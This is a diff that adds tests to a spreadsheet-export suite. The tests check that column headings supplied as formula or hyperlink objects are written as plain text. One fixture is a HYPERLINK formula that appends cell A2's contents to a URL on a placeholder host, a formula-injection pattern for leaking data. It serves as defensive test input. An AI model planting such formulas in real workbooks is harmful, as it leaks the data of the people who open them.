@@ -408,3 +408,33 @@ describe('rule colours in the workbook', () => {
     expect(head.font?.color).toBeUndefined();
   }, 30_000);
 });
+
+describe('a heading that is not text never becomes a live cell', () => {
+  // exceljs reads a cell's TYPE from the shape of the value it is handed: `{formula}` is a
+  // formula, `{text, hyperlink}` a link. A calculated name that arrived as an object (an
+  // imported template, or a save from before the import sanitiser checked it) became the
+  // heading — so the workbook carried a formula the file's author wrote. Every cell must
+  // reach exceljs as a number or a string. (ifcTable's fix of 2026-11-07, ported for v1.5.0.)
+  const shapes: [string, unknown][] = [
+    ['a formula', { formula: 'HYPERLINK("http://x/?d="&A2,"Area")', result: 'Area' }],
+    ['a hyperlink', { text: 'Area', hyperlink: 'http://x/' }],
+  ];
+  for (const [label, name] of shapes) {
+    it(`writes ${label} heading as plain text`, async () => {
+      const store = build([{ name: 'A', w: 0.9 }]);
+      const def = {
+        ...emptySchedule('Doors', ['IfcDoor']),
+        columns: [colName, { field: { kind: 'formula', id: 'c1' } }],
+        calculated: [{ id: 'c1', name, kind: 'formula', formula: '1' }],
+      } as unknown as ScheduleDef;
+      const blob = await xlsxBlob([{ name: 'Doors', res: fullResult(store, def) }]);
+
+      const ExcelJS = await import('exceljs');
+      const wb = new ExcelJS.Workbook();
+      await wb.xlsx.load(await blob.arrayBuffer());
+      const head = wb.getWorksheet('Doors')!.getRow(1).getCell(2);
+      expect(head.type).toBe(ExcelJS.ValueType.String);
+      expect(typeof head.value).toBe('string');
+    }, 30_000);
+  }
+});
